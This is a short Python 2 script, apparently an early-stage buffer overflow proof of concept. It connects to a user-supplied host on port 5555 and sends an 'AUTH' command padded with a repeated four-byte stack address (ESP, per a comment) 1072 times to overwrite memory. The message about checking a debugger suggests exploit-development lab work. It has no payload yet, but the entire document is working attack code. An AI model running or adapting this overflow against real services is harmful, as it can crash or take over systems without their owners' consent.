#!/usr/bin/python
import time, struct, sys
import socket as so

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     server = sys.argv[1]
     port = 5555
except IndexError:
     print "[+] Usage %s host" % sys.argv[0]
     sys.exit()
#ESP 01D1FE5C
req1 = "AUTH " + "\x5c\xfe\xd1\x01"*1072

try:
       s.connect((server, port))
       print repr(s.recv(1024))
       s.send(req1)
       print repr(s.recv(1024))
except:
       print "[!] connection refused, check debugger"



